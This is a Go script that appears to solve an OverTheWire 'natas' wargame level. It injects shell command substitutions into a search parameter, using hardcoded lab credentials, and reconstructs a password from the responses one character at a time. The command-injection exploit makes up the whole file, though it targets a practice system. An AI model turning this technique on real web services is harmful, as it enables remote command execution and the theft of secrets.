package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"time"
)

func main() {
	start := time.Now()

	key := ""

	dict := []string{"African", "Africans", "Allah", "Allah's", "American", "Americanism", "Americanism's", "Americanisms", "Americans", "April", "April's", "Aprils", "Asian", "Asians", "August", "August's", "Augusts", "B", "B's", "British", "Britisher", "Brown", "Brown's", "C", "C's", "Catholic", "Catholicism", "Catholicism's", "Catholicisms", "Catholics", "Celsius", "Celsiuses", "Chicano", "Chicano's", "Chicanos", "Christian", "Christian's", "Christianities", "Christianity", "Christianity's", "Christians", "Christmas", "Christmas's", "Christmases", "Congress", "Congress's", "Cs", "D", "D's", "December", "December's", "Decembers", "Doctor", "Dutch", "Dutch's", "E", "E's", "Easter", "Easter's", "Easters", "England", "England's", "English", "English's", "Englished", "Englisher", "Englishes", "Englishing", "Es", "Eskimo", "Eskimo's", "Eskimos", "Europe", "Europe's", "European", "Europeans", "F", "F's", "Fahrenheit", "Fahrenheits", "Februaries", "February", "February's", "Februarys", "French", "French's", "Friday", "Friday's", "Fridays", "G", "G's", "God", "God's", "Greek", "Greek's", "Greeks", "H", "H's", "Halloween", "Halloween's", "Halloweens", "Hebrew", "Hebrew's", "Hebrews", "Hispanic", "Hispanics", "I", "I'm", "Indian", "Indian's", "Indians", "Islam", "Islam's", "Islamic", "Islamics", "Islams", "Januaries", "January", "January's", "Januarys", "Jew", "Jew's", "Jewish", "Jews", "John", "John's", "Judaism", "Judaism's", "Judaisms", "Julies", "July", "July's", "June", "June's", "Junes", "K", "K's", "Koran", "Koran's", "Korans", "Latin", "Latin's", "Latiner", "Latins", "March", "March's", "Marches", "Marxism", "Marxism's", "Marxisms", "Marxist", "Marxist's", "Marxists", "May", "May's", "Mays", "Mister", "Mister's", "Monday", "Monday's", "Mondays", "Moslem", "Moslem's", "Moslems", "Mr", "Mr's", "Mrs", "Ms", "Muslim", "Muslim's", "Muslims", "N", "N's", "Nazi", "Nazi's", "Nazis", "Negro", "Negro's", "Negroes", "November", "November's", "Novembers", "O", "OK", "OKs", "October", "October's", "Octobers", "Os", "P", "P's", "Passover", "Passover's", "Passovers", "Protestant", "Protestant's", "Protestants", "S", "S's", "Sabbath", "Sabbath's", "Sabbaths", "Satan", "Satan's", "Saturday", "Saturday's", "Saturdays", "Scotch", "Scotches", "September", "September's", "Septembers", "Sunday", "Sunday's", "Sundays", "T", "T's", "Taurus", "Taurus's", "Tauruses", "Thursday", "Thursday's", "Thursdays", "Tuesday", "Tuesday's", "Tuesdays", "U", "V", "V's", "W", "W's", "Wednesday", "Wednesday's", "Wednesdays", "Xmas", "Xmas's", "Xmases", "Y", "Y's", "Yankee", "Yankee's", "Yankees", "Yiddish", "Yiddish's", "a", "aardvark", "aardvark's", "abaci", "aback", "abacus", "abacus's", "abacuses", "abandon", "abandoned", "abandoning", "abandonment", "abandonment's", "abandons", "abate", "abated", "abates", "abating", "abbey", "abbey's", "abbeys", "abbot"}

	host := "natas16:3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L@natas16.natas.labs.overthewire.org"

	for i := 0; i < 33; i++ {

		file, err := ioutil.ReadFile(fmt.Sprintf("natas16payloads/%d.txt", i))
		if err != nil {
			panic(err)
		}

		cmd := fmt.Sprintf("^$(%v)", string(file))

		before := time.Now()

		resp, err := http.Get(fmt.Sprintf("http://%v/?needle=%s", host, url.QueryEscape(cmd)))
		if err != nil {
			panic(err)
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)

		output := string(body)

		pre := strings.Index(output, "<pre>")
		post := strings.Index(output, "</pre>")

		between := output[pre+len("<pre>") : post]
		betweenArr := strings.Split(between, "\n")

		sort.Strings(betweenArr)

		if len(betweenArr) >= 2 {
			for p, v := range dict {
				if v == betweenArr[2] {

					fmt.Printf("Found: %d:%v == %c\n", p, v, p)
					key = fmt.Sprintf("%s%c", key, p)

				}
			}
		}

		after := time.Now()

		fmt.Printf("\n\nexecuted query %d. time:%v\n", i, after.Sub(before))
	}

	done := time.Now()
	fmt.Printf("Done! %v\nkey:%s\n", done.Sub(start), key)
}
